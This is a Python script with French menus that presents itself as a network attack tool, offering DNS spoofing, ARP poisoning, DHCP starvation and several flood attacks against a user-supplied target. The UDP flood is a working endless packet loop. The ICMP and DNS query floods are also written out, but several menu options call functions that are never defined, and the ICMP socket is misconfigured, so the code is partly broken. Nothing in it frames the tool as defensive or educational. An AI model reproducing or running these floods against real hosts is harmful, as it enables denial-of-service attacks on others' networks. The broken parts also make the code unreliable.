import os
import socket
import time
import platform
import clear

# Function to perform a DNS Query Flood attack
def dns_query_flood(target_domain):
    print("Démarrage de l'attaque par inondation de requêtes DNS...")
    os.system(f"dnsenum -d {target_domain} -r 1000")

# Function to perform a UDP Flood attack
def udp_flood(target_ip, target_port):
    print("Démarrage de l'attaque par inondation UDP...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"X" * 1024, (target_ip, target_port))

# Function to perform an ICMP Flood attack
def icmp_flood(target_ip):
    print("Démarrage de l'attaque par inondation ICMP...")
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)
    while True:
        sock.sendto(b"X" * 64, (target_ip, 1))

# Main program
def main():
    while True:
        clear.clear()
        print("Bienvenue dans l'outil d'attaque réseau !")
        print("-------------------------------")
        print("1. Attaque par spoofing DNS")
        print("   - Description : Trompe les victimes pour qu'elles communiquent avec un faux serveur.")
        print("2. Attaque par empoisonnement ARP")
        print("   - Description : Manipule les tables ARP pour intercepter le trafic.")
        print("3. Attaque par saturation DHCP")
        print("   - Description : Épuise le pool de baux du serveur DHCP, niant l'accès aux clients légitimes.")
        print("4. Attaque par inondation TCP SYN")
        print("   - Description : Surcharge la cible avec des connexions TCP incomplètes.")
        print("5. Attaque par inondation de requêtes DNS")
        print("   - Description : Envoie un grand nombre de requêtes DNS pour épuiser les ressources du serveur.")
        print("6. Attaque par inondation UDP")
        print("   - Description : Surcharge la cible avec des paquets UDP, provoquant un déni de service.")
        print("7. Attaque par inondation ICMP")
        print("   - Description : Envoie un grand nombre de requêtes ICMP echo pour épuiser les ressources de la cible.")
        print("8. Quitter")

        choice = input("Entrez votre choix : ")

        if choice == "1":
            clear.clear()
            dns_spoofing_attack()
            print("Attaque par spoofing DNS démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "2":
            clear.clear()
            arp_poisoning_attack()
            print("Attaque par empoisonnement ARP démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "3":
            clear.clear()
            dhcp_starvation_attack()
            print("Attaque par saturation DHCP démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "4":
            clear.clear()
            target_ip = input("Entrez l'adresse IP cible : ")
            target_port = int(input("Entrez le port cible : "))
            tcp_syn_flood_attack(target_ip, target_port)
            print("Attaque par inondation TCP SYN démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "5":
            clear.clear()
            target_domain = input("Entrez le domaine cible : ")
            dns_query_flood(target_domain)
            print("Attaque par inondation de requêtes DNS démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "6":
            clear.clear()
            target_ip = input("Entrez l'adresse IP cible : ")
            target_port = int(input("Entrez le port cible : "))
            udp_flood(target_ip, target_port)
            print("Attaque par inondation UDP démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "7":
            clear.clear()
            target_ip = input("Entrez l'adresse IP cible : ")
            icmp_flood(target_ip)
            print("Attaque par inondation ICMP démarrée !")
            input("Appuyez sur Entrée pour continuer...")
        elif choice == "8":
            clear.clear()
            print("Au revoir !")
            break
        else:
            clear.clear()
            print("Choix invalide. Réessayez !")
            input("Appuyez sur Entrée pour continuer...")


if __name__ == '__main__':
    main()
